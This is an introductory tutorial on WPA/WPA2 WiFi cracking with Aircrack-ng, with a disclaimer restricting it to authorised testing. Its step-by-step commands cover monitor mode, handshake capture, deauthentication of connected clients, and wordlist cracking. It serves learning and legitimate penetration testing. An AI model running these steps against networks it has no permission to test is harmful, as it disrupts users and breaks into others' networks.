# My First WiFi Hacking

This guide documents the very first steps in wireless security testing, focusing on capturing handshakes and performing basic cracking using **Aircrack-ng**.

> ⚠️ **For educational & authorized pentesting only.** Never test on networks you do not own or have explicit permission to audit.

---

## 1. Identify Your Wireless Interface

Before doing anything, you must know the **actual name** of your WiFi interface.

List all interfaces:

```bash
ip link
```

Or using `iw`:

```bash
iw dev
```

Typical names:

* `wlan0`
* `wlp2s0`
* `wlx<mac>`

You **must use the correct interface name** when enabling monitor mode.

---

## 2. Install Aircrack-ng

Aircrack-ng is a core toolkit for 802.11 auditing: monitor mode, packet capture, handshake collection, and WEP/WPA cracking.

### **Debian / Ubuntu**

```bash
sudo apt update
sudo apt install aircrack-ng
```

### **Arch Linux**

```bash
sudo pacman -S aircrack-ng
```

### **Fedora**

```bash
sudo dnf install aircrack-ng
```

### **Kali / Parrot**

Already included; verify installation:

```bash
aircrack-ng --version
```

---

## 3. Check Wireless Card Capabilities

Your WiFi card must support **monitor mode** and **packet injection**.

```bash
sudo airmon-ng
sudo aireplay-ng --test wlan0
```

---

## 4. Enable Monitor Mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Your interface will become something like:

```
wlan0 -> wlan0mon
```

---

## 5. Scan Nearby WiFi Networks

```bash
sudo airodump-ng wlan0mon
```

Record:

* **BSSID** (AP MAC address)
* **Channel (CH)**
* **Stations** (clients connected to the AP)

---

## 6. Capture a WPA/WPA2 Handshake

Lock the channel and start capturing traffic:

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

When a client reconnects, a handshake will appear.

### (Optional) Force a reconnect using deauthentication

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

---

## 7. Crack the Captured Handshake

After obtaining `capture.cap`:

```bash
aircrack-ng capture.cap -w wordlist.txt
```

Notes:

* Use a good wordlist (e.g., `rockyou.txt`)
* Make sure wordlist encoding is UTF‑8
* Cracking speed depends heavily on CPU/GPU

---

## 8. Next Steps

* Try multiple attack scenarios and network setups
* Learn PMKID attack (`hashcat -m 16800`)
* Understand handshake formats (pcap, hccapx, pmkid)
* Dive deeper into 802.11 frames and Layer 2 flow

---

## Notes

This is an introductory step in wireless hacking and part of the **tnsqkyy/hackbook** project. The main repository will include categorized topics such as WiFi, Networking, Web, Linux, Privilege Escalation, and more.
